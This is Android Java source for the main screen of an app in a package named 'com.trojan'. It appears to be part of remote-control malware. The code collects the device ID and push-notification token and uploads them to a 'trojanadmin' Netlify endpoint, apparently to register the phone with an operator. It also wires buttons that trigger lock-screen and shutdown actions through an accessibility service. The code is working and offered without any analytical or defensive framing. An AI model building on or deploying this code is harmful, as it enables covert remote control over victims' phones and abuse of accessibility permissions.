package com.trojan;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.messaging.FirebaseMessaging;

import org.json.JSONException;
import org.json.JSONObject;

public class MainActivity extends Activity {

    private static final String TAG = "MainActivity";
    
    // --- UI Elements ---
    private TextView tvDeviceInfo;
    private Button btnOpenAccessibility;
    private Button btnTestLock;
    private Button btnTestShutdown;
    
    // --- New variables for the retry logic ---
    private RequestQueue requestQueue; // More efficient to have one queue for the activity's lifecycle
    private int retryCount = 0;
    private static final int MAX_RETRIES = 3; // We will try a total of 3 times after the initial failure
    private static final long INITIAL_RETRY_DELAY_MS = 5000; // Start with a 5-second delay

    @SuppressLint("HardwareIds")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // --- Find all UI elements ---
        tvDeviceInfo = findViewById(R.id.tvDeviceInfo);
        btnOpenAccessibility = findViewById(R.id.btnOpenAccessibility);
        btnTestLock = findViewById(R.id.btnTestLock);
        btnTestShutdown = findViewById(R.id.btnTestShutdown);
        
        // --- Initialize the Volley RequestQueue once ---
        requestQueue = Volley.newRequestQueue(this);

        // --- Get Device ID and then fetch the FCM Token ---
        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        String deviceInfoText = "Device ID:\n" + deviceId;
        tvDeviceInfo.setText(deviceInfoText);

        // Start the process to get the token and upload it to Netlify
        getTokenAndRegisterWithNetlify(deviceId);

        // --- Button click listeners (No changes here) ---
        btnOpenAccessibility.setOnClickListener(v -> {
            startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
        });
        btnTestLock.setOnClickListener(v -> {
            sendBroadcast(new Intent(PowerAccessibilityService.ACTION_TRIGGER_LOCK_SCREEN));
        });
        btnTestShutdown.setOnClickListener(v -> {
            sendBroadcast(new Intent(PowerAccessibilityService.ACTION_TRIGGER_SHUTDOWN));
        });
    }

    /**
     * Fetches the FCM token. This is the starting point of our process.
     */
    private void getTokenAndRegisterWithNetlify(String deviceId) {
        tvDeviceInfo.append("\n\nFetching FCM Token...");
        FirebaseMessaging.getInstance().getToken().addOnCompleteListener(task -> {
            if (!task.isSuccessful()) {
                Log.w(TAG, "Fetching FCM registration token failed", task.getException());
                tvDeviceInfo.append("\n\nFetching FCM Token Failed.");
                return;
            }
            String token = task.getResult();
            Log.d(TAG, "FCM Token acquired. Starting registration process.");
            // Reset retry counter and start the first upload attempt
            retryCount = 0; 
            registerDeviceWithNetlify(deviceId, token);
        });
    }

    /**
     * The main function to send the device data to Netlify. This can be called multiple times for retries.
     */
    private void registerDeviceWithNetlify(String deviceId, String token) {
        if (retryCount == 0) {
            tvDeviceInfo.append("\n\nUploading to server...");
        }

        String url = "https://trojanadmin.netlify.app/.netlify/functions/register-device";
        JSONObject postData = new JSONObject();
        try {
            postData.put("deviceId", deviceId);
            postData.put("token", token);
        } catch (JSONException e) {
            tvDeviceInfo.append("\n\nError creating JSON payload.");
            return;
        }

        JsonObjectRequest jsonObjectRequest = new JsonObjectRequest(
            Request.Method.POST, url, postData,
            response -> {
                // SUCCESS! The server responded positively.
                Log.d("NETLIFY_REGISTER", "Success: " + response.toString());
                tvDeviceInfo.append("\n\n✅ Token successfully registered!");
                retryCount = 0; // Reset counter on success
            },
            error -> {
                // FAILURE! The server responded with an error.
                Log.e("NETLIFY_REGISTER", "Error: " + error.toString());
                // Instead of giving up, we schedule a retry.
                scheduleRetry(deviceId, token);
            }
        );
        // Add the request to the queue to be sent.
        requestQueue.add(jsonObjectRequest);
    }

    /**
     * This function is called when a network request fails. It handles the logic
     * for waiting and trying again.
     */
    private void scheduleRetry(String deviceId, String token) {
        retryCount++;
        if (retryCount <= MAX_RETRIES) {
            // Calculate delay with exponential backoff (e.g., 5s, 10s, 20s)
            long delayMs = INITIAL_RETRY_DELAY_MS * (long) Math.pow(2, retryCount - 1);
            
            String retryMessage = String.format("\n\nUpload failed. Retrying in %d seconds... (Attempt %d/%d)", delayMs / 1000, retryCount, MAX_RETRIES);
            tvDeviceInfo.append(retryMessage);
            Log.w(TAG, retryMessage);
            
            // Use a Handler to wait for the specified delay before trying again.
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                Log.i(TAG, "Executing scheduled retry...");
                registerDeviceWithNetlify(deviceId, token);
            }, delayMs);

        } else {
            // We've exceeded the maximum number of retries. Give up.
            String finalFailMessage = "\n\n❌ Upload failed after multiple attempts. Please check network or restart app.";
            tvDeviceInfo.append(finalFailMessage);
            Log.e(TAG, "Max retries reached. Upload failed permanently.");
        }
    }
}
